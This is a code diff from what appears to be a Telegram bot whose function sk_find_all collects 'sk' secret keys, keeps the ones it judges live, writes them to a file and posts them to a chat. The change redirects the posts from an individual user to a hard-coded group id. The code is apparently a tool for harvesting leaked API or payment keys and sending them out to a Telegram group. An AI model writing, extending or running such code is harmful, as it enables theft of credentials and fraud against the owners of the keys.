@@ -164,7 +164,7 @@ async def sk_find_all(client, m):
     livesk = get_tokens(sks)
     
     liveskall = filter_sk(livesk)
-    
+    groupid = [-1001919087738]
     print(liveskall)
     with open("livesk.txt", "a+") as f:
         f.seek(0)
@@ -172,7 +172,8 @@ async def sk_find_all(client, m):
             return
         f.write(f'{liveskall}\n')
         try:
-            await bot.send_message(chat_id="md_abdul_kuddus", text=livesk, disable_web_page_preview=True, reply_markup=START_BUTTONS)
+            #await bot.send_message(chat_id="md_abdul_kuddus", text=livesk, disable_web_page_preview=True, reply_markup=START_BUTTONS)
+            await bot.send_message(groupid, text=livesk, disable_web_page_preview=True, reply_markup=START_BUTTONS)
             sleep(3)
         except Exception as e:
              print("Error sending message:", str(e))
